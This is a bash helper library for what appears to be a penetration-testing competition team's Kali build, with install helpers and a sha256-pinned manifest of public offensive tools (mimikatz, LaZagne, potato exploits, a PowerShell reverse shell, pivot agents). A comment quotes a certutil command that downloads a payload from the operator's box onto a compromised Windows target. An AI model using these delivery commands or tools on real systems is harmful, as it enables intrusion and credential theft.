#!/bin/bash
# lib.sh - shared helpers for start.sh / all.sh / ad.sh.
#
# WHY THIS FILE EXISTS
# print_*, fin_msg, apt_install and pip_ensure used to be copy-pasted into every
# installer. The line count was never the problem - DRIFT was. A fix applied to
# apt_install in all.sh did not reach ad.sh, and nothing anywhere reported the
# divergence. Same class of bug as the duplicated redactor in command_logging.sh.
#
# NOT sourced by smol-all.sh, on purpose: that script runs on a freshly rebuilt
# box where the repo clone may be partial, so it must not depend on a sibling file.
# That is the one place where duplication buys something real.
#
# Usage:  source "$SCRIPT_DIR/lib.sh"

# Guard against double-sourcing (all.sh -> lib.sh, and a helper that re-sources).
[ -n "${_CPTC_LIB_LOADED:-}" ] && return 0
_CPTC_LIB_LOADED=1

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'

print_status()  { echo -e "${BLUE}[*]${NC} $1"; }
print_success() { echo -e "${GREEN}[+]${NC} $1"; }
print_error()   { echo -e "${RED}[-]${NC} $1"; }
print_warning() { echo -e "${YELLOW}[!]${NC} $1"; }

fin_msg() {
    echo -e "\n${GREEN}#################################${NC}"
    echo -e "${GREEN}  $1 DONE${NC}"
    echo -e "${GREEN}#################################${NC}\n"
}

# ---------------------------------------------------------------------------
# WHOSE HOME IS IT?  - sudo-safe resolution of the operator's home directory
# ---------------------------------------------------------------------------
# THE PROBLEM. Under `sudo bash all.sh`, $HOME is /root. Every ~/dropzone,
# ~/.zshrc, ~/.BurpSuite and ~/pins.lock in these scripts then lands in /root:
# the tools install somewhere the operator cannot reach without sudo, the shell
# hooks are written to root's rc files so NOTHING is logged for the actual user,
# and the verification pass afterwards looks in the real home and reports
# NOT FOUND for things that installed fine. That is the same shape as the old
# /home/kali bug in REHEARSAL.md, and start.sh could only warn about it.
#
# THE FIX. Derive the home from the SCRIPT'S OWN PATH. An operator clones this
# repo into their own home, so the path we are executing from names them -
# /home/abdallah/cptc/scripts/... means the home is /home/abdallah - and that
# holds no matter who sudo says we are. The path is checked against passwd so a
# repo in an odd location cannot invent a user.
#
# Order: script path -> $SUDO_USER -> $HOME. Resolved once into $USER_HOME.
# USE $USER_HOME, NOT $HOME OR ~, ANYWHERE A PATH LANDS IN THE OPERATOR'S HOME.
cptc_user_home() {
    local probe="${1:-${BASH_SOURCE[0]}}" dir u home
    dir=$(cd "$(dirname "$probe")" 2>/dev/null && pwd) || dir=""
    # 1. the path we are running from names its owner
    if [[ $dir =~ ^/home/([^/]+)(/|$) ]]; then
        u="${BASH_REMATCH[1]}"
        home=$(getent passwd "$u" 2>/dev/null | cut -d: -f6)
        if [ -n "$home" ] && [ -d "$home" ]; then printf '%s\n' "$home"; return 0; fi
        if [ -d "/home/$u" ]; then printf '%s\n' "/home/$u"; return 0; fi
    fi
    # 2. sudo records who invoked it
    if [ -n "${SUDO_USER:-}" ] && [ "${SUDO_USER}" != "root" ]; then
        home=$(getent passwd "$SUDO_USER" 2>/dev/null | cut -d: -f6)
        if [ -n "$home" ] && [ -d "$home" ]; then printf '%s\n' "$home"; return 0; fi
    fi
    # 3. nothing better to go on
    printf '%s\n' "$HOME"
}

USER_HOME="${USER_HOME:-$(cptc_user_home)}"
# Who owns that home - used to hand back anything we create while root.
CPTC_USER="$(stat -c %U "$USER_HOME" 2>/dev/null || id -un)"
export USER_HOME CPTC_USER

# Give files back to the operator when we created them as root. A no-op for a
# normal run. Without this, a sudo build leaves root-owned ~/dropzone and
# ~/pins.lock that the operator then cannot write to.
own_user() {
    [ "$(id -u)" -eq 0 ] || return 0
    [ -n "${CPTC_USER:-}" ] || return 0
    chown -R "$CPTC_USER:" "$@" 2>/dev/null
    return 0
}

if [ "$USER_HOME" != "${HOME:-}" ]; then
    print_warning "Running as $(id -un), but installing for '$CPTC_USER' -> $USER_HOME"
    print_warning "  (resolved from this script's path; \$HOME said ${HOME:-unset})"
fi

# ---------------------------------------------------------------------------
# Install helpers - idempotent, and one failure never sinks a batch.
# ---------------------------------------------------------------------------
APT_FAILED=()      # apt packages that failed; callers report this at the end
UNPINNED=()        # artifacts fetched without a version pin (see PINS below)
HASH_MISMATCH=()   # artifacts whose sha256 did not match the manifest

# Install apt packages ONE AT A TIME so a single failure is logged and skipped
# instead of aborting the whole 'apt install a b c' transaction. Already-present
# packages are detected with dpkg and skipped without hitting the network.
apt_install() {
    local pkg
    for pkg in "$@"; do
        if dpkg -s "$pkg" &>/dev/null; then
            print_success "$pkg already installed"
        elif sudo env DEBIAN_FRONTEND=noninteractive apt-get install -y \
                 -o Dpkg::Options::=--force-confdef \
                 -o Dpkg::Options::=--force-confold "$pkg"; then
            # 'sudo env DEBIAN_FRONTEND=...' is REQUIRED: sudo strips the exported
            # DEBIAN_FRONTEND, so without this, debconf prompts (docker.io's
            # "Remove all Docker data?", neo4j's preconfigure) appear and fail the
            # non-interactive install.
            # The two Dpkg::Options close the OTHER interactive path that
            # DEBIAN_FRONTEND does not cover: when a package ships a changed
            # config file, dpkg stops and asks keep/replace. --force-confdef plus
            # --force-confold answers "keep what is there" without asking, which
            # is the right answer on a box we are building, and means an install
            # can never block waiting for someone who is not watching.
            print_success "$pkg installed"
        else
            print_warning "$pkg FAILED to install"
            APT_FAILED+=("$pkg")
        fi
    done
}

# Idempotent pip install: skip entirely if the module already imports, so re-runs
# and cross-script duplicates don't re-resolve. $1=import name, rest=pip specs.
pip_ensure() {
    local mod=$1; shift
    if python3 -c "import $mod" &>/dev/null; then
        print_success "python: $mod already present (skip)"
    elif pip install "$@" --break-system-packages; then
        print_success "python: $mod installed"
    else
        print_warning "python: $mod FAILED to install"
    fi
}

# ---------------------------------------------------------------------------
# PIN MANIFEST
# ---------------------------------------------------------------------------
# Every third-party artifact we download, in one place, with the version we
# intend and the sha256 we expect.
#
# THE PROBLEM THIS SOLVES: half of these used to be pinned (winpeas, pspy,
# chisel, kerbrute, windapsearch) and half tracked 'latest' / 'master' / '@latest'.
# That means two operators building on the same morning can end up with different
# binaries, "it worked on my box" stops being meaningful, and an upstream release
# can land in the middle of an engagement without anyone choosing it. The repo
# freeze the week before the event gives us SCRIPT stability, not ARTIFACT
# stability - this manifest is what gives us the second one.
#
# PIN_SHA values of "TBD" mean UNVERIFIED. They are not a placeholder to be
# guessed at: a wrong hash is worse than none. Fill them in during a rehearsal on
# a trusted network with:   bash pins.sh --record
# then commit the result. Until then every unpinned/unverified artifact is
# reported at the end of the run rather than silently accepted.
declare -A PIN_URL PIN_SHA PIN_VER

# --- pinned by version already ---
PIN_URL[winpeas]="https://github.com/peass-ng/PEASS-ng/releases/download/20241011-2e37ba11/winPEASx64.exe"
PIN_VER[winpeas]="20241011-2e37ba11"; PIN_SHA[winpeas]="ea33954741d44c9f46ab6f40fed29acd2833b9fdcc33b3990fab573522f2e446"

PIN_URL[pspy64]="https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64"
PIN_VER[pspy64]="v1.2.1";             PIN_SHA[pspy64]="c93f29a5cc1347bdb90e14a12424e6469c8cfea9a20b800bc249755f0043a3bb"

PIN_URL[chisel]="https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz"
PIN_VER[chisel]="v1.10.1";            PIN_SHA[chisel]="0525aa3c5d457f2a4075e66221d5125d434bedf15006d3271c213f5cd6ff2230"

PIN_URL[kerbrute]="https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64"
PIN_VER[kerbrute]="v1.0.3";           PIN_SHA[kerbrute]="710a9d2653c8bd3689e451778dab9daec0de4c4c75f900788ccf23ef254b122a"

PIN_URL[windapsearch]="https://github.com/ropnop/go-windapsearch/releases/download/v0.3.0/windapsearch-linux-amd64"
PIN_VER[windapsearch]="v0.3.0";       PIN_SHA[windapsearch]="15abbc5e2422158d64b4f604424972309fb79bb53b59bf5a527b16662d8636c1"

# --- NOT pinned: these track a moving target. Pin them at the next rehearsal. ---
PIN_URL[linpeas]="https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
PIN_VER[linpeas]="latest";            PIN_SHA[linpeas]="795e315c42c58e27841e4ee2798a73a9309694f0454b34707299bb090e04b98d"

PIN_URL[powerup]="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1"
PIN_VER[powerup]="master";            PIN_SHA[powerup]="9d59d4c128570eb80c0e8d13e2185030f93d965278b203c91dd196b2e1d3cd22"

PIN_URL[privesc_ps1]="https://raw.githubusercontent.com/enjoiz/Privesc/refs/heads/master/privesc.ps1"
PIN_VER[privesc_ps1]="master";        PIN_SHA[privesc_ps1]="e61e343192305413e8275d0a9c75d76e0cf1d4beff1636846b6471718a6b94a6"

PIN_URL[privesccheck]="https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1"
PIN_VER[privesccheck]="latest";       PIN_SHA[privesccheck]="60eacd57fc869e36170cc3cf1bdbc5da7aacfd799be353cd9509336b783e8389"

PIN_URL[username_anarchy]="https://raw.githubusercontent.com/urbanadventurer/username-anarchy/refs/heads/master/username-anarchy"
PIN_VER[username_anarchy]="master";   PIN_SHA[username_anarchy]="64832f9bcdb7a27d0928c7c52a8eda4a460f4e7065e607c96a3cbd09b8dafe36"

PIN_URL[upshell]="https://raw.githubusercontent.com/brightio/penelope/main/extras/manual_tty_upgrade.sh"
PIN_VER[upshell]="main";              PIN_SHA[upshell]="a8ec5a7b2b79c20d1a53c55da0966c311acb67fd9be689583e49f29cc48fcc7b"

# --- added 2026-09-22 ------------------------------------------------------
# ysoserial: Java deserialisation gadget chains. Needs a JRE - openjdk-11-jdk is
# already in all.sh's apt list and all.sh verifies that 'java -version' runs.
PIN_URL[ysoserial]="https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar"
PIN_VER[ysoserial]="v0.0.6";          PIN_SHA[ysoserial]="2c9bddd6a1a4ec66c1078ea97dacb61eb66d1c41aec7b6d21e3c72214ce170f1"

# AzureHound: BloodHound's Entra ID / Azure collector. Ships as a ZIP, which is why
# 'unzip' joined all.sh's apt list.
PIN_URL[azurehound]="https://github.com/SpecterOps/AzureHound/releases/download/v3.1.1/AzureHound_v3.1.1_linux_amd64.zip"
PIN_VER[azurehound]="v3.1.1";         PIN_SHA[azurehound]="c049a766e9b70436ce4125c9aa5dc878709b34af9a7acf98c10acad95e955bf5"

# Android Studio: 1.5 GB download, ~4 GB installed. all.sh --ismael only.
# This is the ONE artifact in this manifest whose sha256 the vendor publishes on the
# download page, so it is pinned for real instead of TBD. If the pin trips, Google
# has shipped a new patch - update URL, version and hash together, never just the hash.
PIN_URL[android_studio]="https://edgedl.me.gvt1.com/android/studio/ide-zips/2026.1.4.8/android-studio-quail4-patch1-linux.tar.gz"
PIN_VER[android_studio]="2026.1.4.8"
PIN_SHA[android_studio]="25c97ca6c6b505f2a20bff962dfd28718327f61e25b09a9bc915f1dae7b1e534"

# --- added 2026-10-05: the Windows payload set --------------------------------
# These are NOT run on our Kali box and NOT run on our Windows box. They are
# payloads UPLOADED to compromised Windows targets, served off Kali - the flow the
# old team's notes/README.md documents verbatim:
#     kali$   cd ~/dropzone/windows && python3 -m http.server 9999
#     target> certutil -urlcache -split -f http://<kali>:9999/Rubeus.exe rb.exe
# That is why they live here and are fetched by ad.sh, rather than being installed
# by windows.ps1. They replace a 72 MB AD_Tools.zip that the previous team checked
# into the repo as an opaque blob: same tools, but versioned, hash-verifiable, and
# traceable to an upstream release instead of being 2024-vintage binaries of
# unknown provenance that we would have to explain if asked to (rules §4.3).
#
# Every URL below was confirmed to resolve on 2026-10-05.

PIN_URL[mimikatz]="https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"
PIN_VER[mimikatz]="2.2.0-20220919";  PIN_SHA[mimikatz]="7accd179e8a6b2fc907e7e8d087c52a7f48084852724b03d25bebcada1acbca5"

PIN_URL[printspoofer64]="https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe"
PIN_VER[printspoofer64]="v1.0";      PIN_SHA[printspoofer64]="8524fbc0d73e711e69d60c64f1f1b7bef35c986705880643dd4d5e17779e586d"

# GodPotato is the one that still works on Server 2016/2019/2022; JuicyPotato is
# kept because it is the one that works on the OLDER hosts an "aging" estate has.
PIN_URL[godpotato]="https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe"
PIN_VER[godpotato]="V1.20";          PIN_SHA[godpotato]="9a8e9d587b570d4074f1c8317b163aa8d0c566efd88f294d9d85bc7776352a28"

PIN_URL[juicypotato]="https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe"
PIN_VER[juicypotato]="v0.1";         PIN_SHA[juicypotato]="0f56c703e9b7ddeb90646927bac05a5c6d95308c8e13b88e5d4f4b572423e036"

PIN_URL[semanagevolume]="https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe"
PIN_VER[semanagevolume]="public";    PIN_SHA[semanagevolume]="c1c4d399694bdb267baf11ebd65408541fc0521be0320b59d0785415a4a80572"

PIN_URL[lazagne]="https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
PIN_VER[lazagne]="v2.4.7";           PIN_SHA[lazagne]="dc06d62ee95062e714f2566c95b8edaabfd387023b1bf98a09078b84007d5268"

PIN_URL[adpeas]="https://github.com/61106960/adPEAS/releases/download/v2.6.0/adPEAS.ps1"
PIN_VER[adpeas]="v2.6.0";            PIN_SHA[adpeas]="24e6bb7b35e2f5baba6202ae4184d215daf96b8b1be155fc0fabd7294fdbf474"

# --- raw master files: NOT pinnable, and that is upstream's fault, not ours ---
# PowerSploit is archived and was never tagged, so PowerView/PowerUp can only be
# taken from master. Same class as the linpeas/powerup entries above: they are
# fetched, recorded in pins.lock, and reported by pin_summary as unpinned.
PIN_URL[powerview_ps1]="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1"
PIN_VER[powerview_ps1]="master";     PIN_SHA[powerview_ps1]="507e8666c239397561c58609f7ea569c9c49ddbb900cd260e7e42b02d03cfd87"

# Powermad writes the machine account that the RBCD chain needs. The old team's
# notes/README.md RBCD walkthrough does not work without this file.
PIN_URL[powermad]="https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1"
PIN_VER[powermad]="master";          PIN_SHA[powermad]="3e0009375dafae4f4977c85be5f33ca3f1cd0903815053c0307cd32bd59abd49"

PIN_URL[invoke_runascs]="https://raw.githubusercontent.com/antonioCoco/RunasCs/master/Invoke-RunasCs.ps1"
PIN_VER[invoke_runascs]="master";    PIN_SHA[invoke_runascs]="69058ca0c4eada431047c0376db8a4728feffbacebbb9578e59f4c9113a342ca"

PIN_URL[sessiongopher]="https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1"
PIN_VER[sessiongopher]="master";     PIN_SHA[sessiongopher]="ddbf3299675ffdd7e3475f8a4848f3ab6cdff8819348c75b9ac4d8fb76569a2c"

PIN_URL[invoke_psh_tcp]="https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1"
PIN_VER[invoke_psh_tcp]="master";    PIN_SHA[invoke_psh_tcp]="0f1e223eaf8b6d71f65960f8b9e14c98ba62e585334a6349bcd02216f4415868"

# --- Microsoft live-download URLs: unversioned BY DESIGN at the vendor end ----
# download.sysinternals.com always serves "current". There is no version in the
# URL and no archive of older ones, so a recorded sha256 here means "this is what
# Microsoft served on the day we built", which is still worth having for the
# box-to-box diff even though it cannot be a pin.
PIN_URL[pstools]="https://download.sysinternals.com/files/PSTools.zip"
PIN_VER[pstools]="current";          PIN_SHA[pstools]="2b10b3d9dae0403b06d90b13bfb53e723a8b14a788f78cdfd43a445d8991415e"

PIN_URL[accesschk]="https://download.sysinternals.com/files/AccessChk.zip"
PIN_VER[accesschk]="current";        PIN_SHA[accesschk]="8ef5e3cf235bcf4ecdcf8b4da1c0016a75f104b8591a65cc083ae3a82d496e07"

# --- the two SharpHounds. READ THIS BEFORE TOUCHING EITHER. ------------------
# SharpHound 1.x emits LEGACY BloodHound format. SharpHound 2.x emits CE format.
# They are NOT interchangeable and mixing a legacy collection with a CE one fails
# at ingest. We run BOTH viewers on purpose (see ad.sh and windows.ps1), so both
# collectors are shipped, into separate directories, so nobody can grab the wrong
# one in a hurry:
#   ~/dropzone/windows/legacy/  -> SharpHound 1.1.1 -> BloodHound 4.3.1 on Windows
#   ~/dropzone/windows/ce/      -> SharpHound 2.x   -> BloodHound CE on Kali
PIN_URL[sharphound_legacy]="https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.1/SharpHound-v1.1.1.zip"
PIN_VER[sharphound_legacy]="v1.1.1"; PIN_SHA[sharphound_legacy]="224d47658e0e7ddc256eb97725179a35e42fed02f7717cf5b62afbae26dcb36b"

PIN_URL[sharphound_ce]="https://github.com/SpecterOps/SharpHound/releases/download/v2.17.0/SharpHound_v2.17.0_windows_x86.zip"
PIN_VER[sharphound_ce]="v2.17.0";    PIN_SHA[sharphound_ce]="09ef123ada22be00a6af4dbfa28f9aa357930205f88991374373d634609efb03"

# --- ligolo-ng: the pivot tool the build did not have -----------------------
# chisel, sshuttle and proxychains were the whole pivoting story. ligolo-ng gives
# a real routed tunnel (TUN interface) rather than a SOCKS proxy everything has to
# be wrapped in, which matters most for exactly the AD tooling that behaves badly
# through proxychains. Proxy runs on Kali, agent goes on the target.
PIN_URL[ligolo_proxy]="https://github.com/nicocha30/ligolo-ng/releases/download/v0.9.2/ligolo-ng_proxy_0.9.2_linux_amd64.tar.gz"
PIN_VER[ligolo_proxy]="v0.9.2";      PIN_SHA[ligolo_proxy]="6c683c403502d366276595197749e620c975908dae7314c21079ec8ebee4e5d0"

PIN_URL[ligolo_agent_win]="https://github.com/nicocha30/ligolo-ng/releases/download/v0.9.2/ligolo-ng_agent_0.9.2_windows_amd64.zip"
PIN_VER[ligolo_agent_win]="v0.9.2";  PIN_SHA[ligolo_agent_win]="bf1e02df68f5bbae9fb8da65f423f0da1537381298730d943cc7dc2fa95cdd39"

PIN_URL[ligolo_agent_lin]="https://github.com/nicocha30/ligolo-ng/releases/download/v0.9.2/ligolo-ng_agent_0.9.2_linux_amd64.tar.gz"
PIN_VER[ligolo_agent_lin]="v0.9.2";  PIN_SHA[ligolo_agent_lin]="714534917a4a58812669619667cc57dfad03d34d0de5b0d7c468d76819f84111"

# Where each box records what it ACTUALLY got. Diff this file between two
# operators' boxes: any difference is a build that will not reproduce.
PINS_LOCK="${PINS_LOCK:-$USER_HOME/pins.lock}"

record_pin() {   # <name> <version-or-commit> <sha256-or--> [path]
    # The 5th column (path) is what makes 'pins.sh --audit' possible: it lets a
    # later run re-hash exactly what landed on THIS box without lib.sh having to
    # carry a destination map that would drift from the call sites. "-" means
    # there is no single file to re-check (a clone, or a compiled Go binary).
    printf '%s\t%s\t%s\t%s\t%s\n' \
        "$(date '+%Y-%m-%dT%H:%M:%S')" "$1" "$2" "$3" "${4:--}" >> "$PINS_LOCK"
}

# verify_on_disk <pin-name> <path>
# Compare a file ALREADY on disk against the manifest. Shared by fetch_pinned's
# skip path and by 'pins.sh --audit', so both answer the question the same way.
# Returns 0 if it matches (or is unpinned), 1 on a mismatch.
verify_on_disk() {
    local name=$1 f=$2 want=${PIN_SHA[$1]:-TBD} ver=${PIN_VER[$1]:-?} got
    got=$(sha256sum "$f" 2>/dev/null | cut -d' ' -f1)
    if [ -z "$got" ]; then
        print_warning "$name present but unreadable: $f"
        return 1
    fi
    if [ "$want" = "TBD" ]; then
        print_warning "$name already present, UNVERIFIED (no pinned hash; got ${got:0:16}...)"
        UNPINNED+=("$name")
        record_pin "$name" "$ver" "${got:--}" "$f"
        return 0
    fi
    if [ "$got" = "$want" ]; then
        print_success "$name already present and matches the pinned sha256"
        record_pin "$name" "$ver" "${got:--}" "$f"
        return 0
    fi
    print_error "$name ON DISK DOES NOT MATCH THE PIN"
    print_error "  expected ${want:0:16}...  got ${got:0:16}..."
    print_error "  $f"
    print_error "  This file predates the pin, was modified, or was swapped."
    print_error "  Delete it and re-run to fetch the pinned version."
    HASH_MISMATCH+=("$name")
    return 1
}

# fetch_pinned <pin-name> <dest> [sudo]
# Idempotent, retries, verifies sha256 when the manifest has one, records what
# actually landed, and flags anything unpinned.
#
# NOTE ON THE SKIP PATH. This used to `return 0` the moment the destination
# existed, BEFORE hashing it. That quietly hollowed out the whole pin mechanism:
#  * every box built before the hashes were recorded kept its unverified
#    artifacts forever, because re-running all.sh/ad.sh never re-checked them;
#  * a truncated, modified or swapped file that already existed was never caught;
#  * record_pin was skipped too, so ~/pins.lock came out INCOMPLETE - which
#    silently broke the "diff pins.lock between two operators' boxes" check that
#    REHEARSAL.md relies on as its reproducibility test.
# The skip path now verifies instead of assuming. It still never re-downloads.
fetch_pinned() {
    local name=$1 dest=$2 pre=${3:-} url=${PIN_URL[$1]:-} want=${PIN_SHA[$1]:-TBD} ver=${PIN_VER[$1]:-?} got
    if [ -z "$url" ]; then
        print_error "fetch_pinned: no manifest entry for '$name'"
        return 1
    fi
    if [ -s "$dest" ]; then
        verify_on_disk "$name" "$dest"
        return $?
    fi
    if ! $pre curl -fSL --retry 3 --connect-timeout 15 "$url" -o "$dest"; then
        print_warning "download failed: $(basename "$dest")"
        return 1
    fi
    got=$(sha256sum "$dest" 2>/dev/null | cut -d' ' -f1)
    if [ "$want" = "TBD" ]; then
        print_warning "$name fetched UNVERIFIED (version: $ver, sha256: ${got:0:16}...)"
        UNPINNED+=("$name")
    elif [ "$got" = "$want" ]; then
        print_success "$name verified against pinned sha256"
    else
        print_error "$name SHA256 MISMATCH - expected ${want:0:16}... got ${got:0:16}..."
        print_error "  Do NOT use this file until you know why. $dest"
        HASH_MISMATCH+=("$name")
        return 1
    fi
    record_pin "$name" "$ver" "${got:--}" "$dest"
    return 0
}

# clone_pinned <name> <url> <dest-dir> [tag]
# With a tag: shallow clone of exactly that tag. Without: clones HEAD and records
# the commit, so two boxes can at least be COMPARED even when not pinned.
clone_pinned() {
    local name=$1 url=$2 dir=$3 tag=${4:-} commit
    if [ -d "$dir" ]; then
        print_success "$name already present (skip)"
        return 0
    fi
    if [ -n "$tag" ]; then
        if ! git clone --depth 1 --branch "$tag" "$url" "$dir"; then
            print_warning "$name clone failed (tag $tag)"
            return 1
        fi
        print_success "$name cloned at $tag"
    else
        if ! git clone "$url" "$dir"; then
            print_warning "$name clone failed"
            return 1
        fi
        print_warning "$name cloned at HEAD (UNPINNED)"
        UNPINNED+=("$name")
    fi
    commit=$(git -C "$dir" rev-parse HEAD 2>/dev/null || echo "-")
    record_pin "$name" "${tag:-HEAD}" "$commit" "$dir"
    return 0
}

# go_install <binary> <module> [version]
# 'go install' COMPILES from source, so skip when the binary exists. Version
# defaults to @latest, which is UNPINNED - the installed version is recorded so
# it can be pinned later.
go_install() {
    local bin=$1 mod=$2 ver=${3:-latest} out
    if command -v "$bin" &>/dev/null || [ -x "${GOPATH:-$HOME/go}/bin/$bin" ]; then
        print_success "$bin already installed (skip)"
        return 0
    fi
    if go install "${mod}@${ver}" 2>/dev/null; then
        print_success "$bin installed (@$ver)"
        [ "$ver" = "latest" ] && UNPINNED+=("$bin")
        out=$("$bin" -version 2>&1 | head -n1 || echo "-")
        record_pin "$bin" "@$ver" "$out" "-"
    else
        print_warning "$bin install failed"
    fi
    return 0
}

# ---------------------------------------------------------------------------
# BURP SUITE COMMUNITY - latest, straight from PortSwigger
# ---------------------------------------------------------------------------
# WHY NOT THE APT PACKAGE. Kali's 'burpsuite' is whatever version the archive
# froze, and the rules only permit Community (Pro is banned), so we want to be
# explicit about which edition we installed as well as be current. This pulls the
# official "latest community" build, which is non-interactive and unambiguous.
#
# WHY THE JAR AND NOT THE .sh INSTALLER. The Linux installer is an install4j
# bundle that wants a GUI unless it is driven with unattended flags, and those
# flags differ between install4j versions. The jar has no installer at all - one
# download, one wrapper script, nothing to answer.
#
# ⚠️ JAVA 21 IS REQUIRED, AND openjdk-11 IS NOT ENOUGH. Measured against the
# 2026.3.3 jar: burp/StartBurp itself is class-file major 65 and 21,371 of the
# baseline classes are major 65, i.e. Java 21. (The jar is Multi-Release, so its
# major-69/Java-25 entries live under META-INF/versions and are overlays, not the
# floor.) An older JVM dies with UnsupportedClassVersionError. all.sh therefore
# installs default-jdk alongside openjdk-11-jdk - 11 stays because ysoserial's
# gadget chains want an old runtime - and the wrapper below picks a JVM >= 21
# rather than trusting whatever 'java' happens to point at.
#
# NOT IN THE PIN MANIFEST, on purpose: the whole point is "latest", and an
# enforced sha256 against a moving URL would fail the build every time
# PortSwigger ships a release. The version and sha256 of what landed are still
# written to pins.lock, so a box-to-box diff still catches a divergence.
BURP_URL="https://portswigger.net/burp/releases/download?product=community&type=Jar"
BURP_DIR="/opt/burpsuite"

# Read the version out of the download's Content-Disposition with a 1-byte range
# request, so we can tell "already current" from "needs updating" for the price of
# 201 bytes instead of 653 MB. A plain HEAD does not return the header.
burp_latest_version() {
    curl -fsSL --max-time 60 -r 0-0 -D - -o /dev/null "$BURP_URL" 2>/dev/null \
        | tr -d '\r' \
        | sed -n 's/.*filename=burpsuite_community_v\([0-9][^;[:space:]]*\)\.jar.*/\1/p' \
        | head -n1
}

install_burp_latest() {
    local want installed jar sha
    want=$(burp_latest_version)
    if [ -z "$want" ]; then
        print_warning "Could not determine the latest Burp version (no egress?)"
        if [ -s "$BURP_DIR/burpsuite.jar" ]; then
            print_warning "  Keeping the Burp already installed at $BURP_DIR"
            return 0
        fi
        return 1
    fi
    installed=$(cat "$BURP_DIR/VERSION" 2>/dev/null || echo "")
    if [ "$installed" = "$want" ] && [ -s "$BURP_DIR/burpsuite.jar" ]; then
        print_success "Burp Suite Community $want already installed (latest)"
        return 0
    fi
    [ -n "$installed" ] && print_status "Burp $installed installed, $want is current - updating"

    jar="$BURP_DIR/burpsuite_community_v${want}.jar"
    sudo mkdir -p "$BURP_DIR" || return 1
    print_status "Downloading Burp Suite Community $want (~650 MB, the single"
    print_status "  largest download in the build after the desktop)..."
    if ! sudo curl -fSL --retry 3 --connect-timeout 15 "$BURP_URL" -o "$jar.part"; then
        print_warning "Burp download failed"
        sudo rm -f "$jar.part"
        return 1
    fi
    # A captive portal answers 200 with an HTML page. A jar starts "PK", and a
    # Burp jar in particular contains its own entry point - check both, because a
    # truncated download is still a valid-looking zip header.
    if ! sudo head -c 2 "$jar.part" | grep -qa "^PK"; then
        print_error "Burp download is not a zip/jar - captive portal or error page?"
        sudo rm -f "$jar.part"
        return 1
    fi
    if ! sudo unzip -l "$jar.part" 'burp/StartBurp.class' >/dev/null 2>&1; then
        print_error "Burp jar has no burp/StartBurp.class - truncated download"
        sudo rm -f "$jar.part"
        return 1
    fi
    sudo mv -f "$jar.part" "$jar"
    sudo ln -sfn "$jar" "$BURP_DIR/burpsuite.jar"
    printf '%s\n' "$want" | sudo tee "$BURP_DIR/VERSION" >/dev/null
    sha=$(sha256sum "$jar" 2>/dev/null | cut -d' ' -f1)
    record_pin "burpsuite" "$want" "${sha:--}" "$jar"
    print_success "Burp Suite Community $want -> $jar"

    # Launcher. Written as a here-doc through tee because /usr/local/bin needs root.
    sudo tee /usr/local/bin/burpsuite >/dev/null <<'WRAPPER'
#!/bin/sh
# Burp Suite Community launcher - installed by the CPTC build scripts.
# Picks a JVM of at least 21, because Burp's own entry point is compiled for 21
# and Kali also ships openjdk-11 (kept for ysoserial). Trusting bare `java` here
# would hand Burp whatever happens to be first on PATH and fail with
# UnsupportedClassVersionError, which reads like a corrupt download rather than a
# wrong JVM and costs an hour to diagnose.
JAR=/opt/burpsuite/burpsuite.jar
pick_java() {
    for cand in $(ls -d /usr/lib/jvm/*/bin/java 2>/dev/null | sort -rV) \
                /usr/lib/jvm/default-java/bin/java "$(command -v java 2>/dev/null)"; do
        [ -x "$cand" ] || continue
        v=$("$cand" -version 2>&1 | sed -n 's/.*version "\([0-9][0-9]*\).*/\1/p' | head -n1)
        [ -n "$v" ] && [ "$v" -ge 21 ] 2>/dev/null && { printf '%s' "$cand"; return 0; }
    done
    return 1
}
JAVA=$(pick_java) || {
    echo "burpsuite: no Java 21+ found. Install one:  sudo apt install -y default-jdk" >&2
    exit 1
}
exec "$JAVA" -jar "$JAR" "$@"
WRAPPER
    sudo chmod 0755 /usr/local/bin/burpsuite
    print_success "Launcher: /usr/local/bin/burpsuite"

    # Desktop entry, so Burp is launchable from the XFCE session start.sh sets up
    # over xRDP - which is the whole reason that desktop is installed.
    sudo tee /usr/share/applications/burpsuite.desktop >/dev/null <<'DESKTOP'
[Desktop Entry]
Type=Application
Name=Burp Suite Community
Comment=Web security testing (Community edition)
Exec=/usr/local/bin/burpsuite
Terminal=false
Categories=Development;Security;
DESKTOP
    fin_msg "Burp Suite Community $want"
    return 0
}

# ---------------------------------------------------------------------------
# VERIFICATION HELPERS
# ---------------------------------------------------------------------------
# These used to exist TWICE - once in all.sh and once in ad.sh, as near-identical
# ~80-line blocks with different counter names (PASS/FAIL vs AD_PASS/AD_FAIL). The
# duplication is gone because the two scripts are now one, and the helpers live
# here because this is where shared code belongs.
#
# THE CONTRACT: RUN the tool, do not just locate it. 'command -v' passes for a
# file that cannot execute - wrong arch, missing shared library, half-configured
# package, truncated download - which is exactly the failure a rebuilt box hits.
#
# COUNTERS use VAR=$((VAR+1)), never ((VAR++)). Post-increment returns the OLD
# value, so at 0 the arithmetic result is 0 and bash reads that as exit status 1;
# any 'cmd && ok && ((PASS++)) || fail' chain then runs BOTH branches. That bug
# was live once and printed "X verified" and "X NOT working" for the same tool.
PASS=0
WARN=0
FAIL=0

# _run_check <desc> <command> [pattern]
